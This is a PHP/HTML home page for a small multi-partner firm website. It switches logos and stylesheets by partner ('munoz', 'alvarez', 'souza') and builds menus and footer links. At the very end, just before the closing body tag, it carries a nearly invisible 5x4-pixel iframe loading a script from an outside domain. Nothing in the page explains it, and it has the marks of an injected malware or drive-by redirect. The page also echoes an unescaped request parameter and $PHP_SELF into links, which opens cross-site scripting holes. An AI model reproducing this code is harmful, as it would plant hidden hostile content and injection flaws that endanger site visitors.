<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');

	$socio=$_REQUEST['intro'];
	if(!isset($socio)) $socio='mdt';
	
	$_SESSION['socio']=$socio;
	
	$prefijo_socio['mdt']='munoz';
	$prefijo_socio['alv']='alvarez';
	$prefijo_socio['sou']='souza';
	
	$pie_socio['munoz']='mdt';
	$pie_socio['alvarez']='alv';
	$pie_socio['souza']='sou';
	
	$_SESSION['sociosel']=$prefijo_socio[$socio];
	
?>

<html>
<head>
<title>M S A</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="estilos.css" rel="stylesheet" type="text/css">
<link href="estilos<?=$prefijo_socio[$socio]?>.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
@font-face {
    font-family: Bliss-Regular;
    font-style:  normal;
    font-weight: normal;
    src: url(<?=$PHP_SELF?>/BLISSRE0.eot);
  }
body {
	margin-left: 2px;
	margin-top: 2px;
	margin-right: 2px;
	margin-bottom: 2px;
}
-->
</style>
<script>
var celda_actual;

function botonover(x){
	x.className='botonesOVER';
}
function botonout(x){
	x.className='botones';
}
function ir_a(x){
 document.getElementById('iframearea').src='./carga_seccion.php?id_sel='+x;
}
</script>
</head>

<div align="center">
	<table width="778" height="100%" border="0" cellpadding="0" cellspacing="0" class="bordeexterno">
		<!--DWLayoutTable-->
		<tr>
			<td width="45" height="343" rowspan="3" valign="top"><!--DWLayoutEmptyCell-->&nbsp;</td>
		    <td width="386" height="86"><a href="<?=$PHP_SELF?>?intro=<?=$socio?>"><img src="images/logo<?=$prefijo_socio[$socio]?>1.gif" border="0"></a></td>
		    <td height="85">&nbsp;</td>
		    <td width="254"><img src="images/direccion<?=$prefijo_socio[$socio]?>.gif"></td>
		</tr>
		<tr>
			<td height="100%" colspan="3" valign="top">
				<table width="100%" height="100%"  border="0" cellpadding="0" cellspacing="0">
                	<tr>
                		<td width="7%" height="25" bgcolor="#666666" class="botonbuscar" scope="col">&nbsp;</td>
                		<td width="93%" height="25" bgcolor="#999999" scope="col">
								<table width="100%" height="27" border="0" cellpadding="0" cellspacing="0" bgcolor="">
										<tr><td height="27">
											<span id="menues">
												<? include('./menues.php'); ?>
												<script type='text/javascript' src='menu9_com.js'></script>
											</span>
										</td></tr>
								</table>
							</td>
               		</tr>
                	<tr>
                		<td class="bordederecho"><img src="images/tierra<?=$prefijo_socio[$socio]?>1.jpg"></td>
                		<td height="100%"  width="100%" rowspan="2" ></td>
           		</tr>
                	<tr class="fondo2">
                		<td height="100%" valign="top" bgcolor="#A5A5A5" class="bordederecho" >
                			<table width="100%"  border="0" cellspacing="0" cellpadding="0">
                            	<tr>
                            		<td height="34" class="botonnovedades" scope="col">Novedades</td>
                           		</tr>
                            	<tr>
                            		<td height="34" class="botonnovedades">Sitios de Inter&eacute;s</td>
                           		</tr>
                            	<tr>
                            		<td height="34" class="botonnovedades">Contacto</td>
                           		</tr>
                           	</table>
                		</td>
               		</tr>
               	</table>
			</td>
		</tr>
		<tr>
			<td colspan="3" valign="top">
				<table width="100%" height="53"  border="0" cellpadding="0" cellspacing="0" class="lineainferior">
                	<tr>
                		<td width="7%" scope="col"><img src="images/idiomasmunoz.gif"></td>
                		<td width="100%" scope="col">&nbsp;</td>
							<?
							foreach($pie_socio as $a=>$b){
								if($b!=$socio){
							?>
               		 <td width="24%" scope="col"><a href="<?=$PHP_SELF?>?intro=<?=$pie_socio[$a]?>"><img src="images/logo<?=$prefijo_socio[$b]?>2.gif" border="0"></a></td>
							<?
								}
							}
							?>
                	    <td width="6%" scope="col">&nbsp;</td>
                	    <td width="12%" scope="col"><img src="images/linea.gif" width="15" height="53"></td>
                	</tr>
               	</table>
			</td>
		</tr>
	</table>
</div>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
